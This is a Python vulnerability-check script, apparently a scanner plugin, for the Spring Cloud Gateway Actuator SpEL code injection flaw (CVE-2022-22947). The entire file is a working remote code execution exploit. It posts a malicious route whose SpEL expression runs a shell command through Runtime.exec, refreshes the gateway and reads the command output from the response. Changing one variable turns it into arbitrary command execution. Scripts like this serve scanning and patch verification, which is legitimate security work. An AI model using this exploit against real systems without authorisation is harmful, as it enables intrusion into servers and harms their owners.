import requests
import re
import urllib
import random, string
import json

def verify(url):
    relsult = {
        'name': 'Spring Cloud Gateway Actuator API SpEL 代码注入 (CVE-2022-22947)',
        'vulnerable': False,
        'attack': True,
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Connection': 'close',
        'Content-Type': 'application/json',
    }
    try:
        cmd = 'id'
        rand_str = ''.join(random.sample(string.digits + string.ascii_letters, 7))
        payload = {
            "id": rand_str,
            "filters": [{
            "name": "AddResponseHeader",
            "args": {
            "name": "Result",
            "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"%s\"}).getInputStream()))}" % cmd
                    }}],
            "uri": "http://example.com"
        }
        vurl1 = urllib.parse.urljoin(url, '/actuator/gateway/routes/' + rand_str)
        vurl2 = urllib.parse.urljoin(url, '/actuator/gateway/refresh')
        rep1 = requests.post(vurl1, timeout=1, data=json.dumps(payload), headers=headers)
        if rep1.status_code == 201:
            rep2 = requests.post(vurl2, timeout=1, headers=headers)
            rep3 = requests.get(vurl1, timeout=2, headers=headers)
            if rep2.status_code == 200 and re.search('uid=.+gid=.+groups=.+', rep3.text):
                relsult['vulnerable'] = True
                relsult['url'] = url
                relsult['payload'] = vurl1
                relsult['about'] = 'https://mp.weixin.qq.com/s/kCbcKuPqy9Ar-arjMYgUmw'
        return relsult
    except:
        return relsult

